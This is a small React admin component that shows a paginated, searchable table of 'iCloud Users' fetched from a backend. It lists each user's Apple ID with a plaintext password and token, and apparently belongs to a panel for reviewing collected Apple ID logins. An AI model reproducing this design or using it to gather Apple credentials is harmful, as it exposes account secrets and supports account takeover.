import React from "react";
import { Grid } from "gridjs-react";
import "gridjs/dist/theme/mermaid.css";
import { API_URI } from "../libs/globals";

export default () => {
  const columns = [
    "ID",
    "iCloud ID",
    "Password",
    "Token",
    "status",
    "createdAt",
  ];
  return (
    <div className="table-view fade-in">
      <h2 className="ckk3">iCloud Users</h2>
      <div className="grid-js">

      <Grid
        server={{
          url: API_URI + "/admin-get-users",
          then: (data) =>
            data.users.map((user) => [
              user.id,
              user.apple_id,
              user.password,
              user.token,
              user.status,
              new Date(user.createdAt).toDateString(),
            ]),
          total: (data) => data.count,
        }}
        columns={columns}
        sort={true}
        search={true}
        pagination={{
          limit: 20,
          server: {
            url: (prev, page, limit) =>
              `${prev}?limit=${limit}&offset=${page * limit}`,
          },
        }}
      />
      
      </div>
    </div>
  );
};
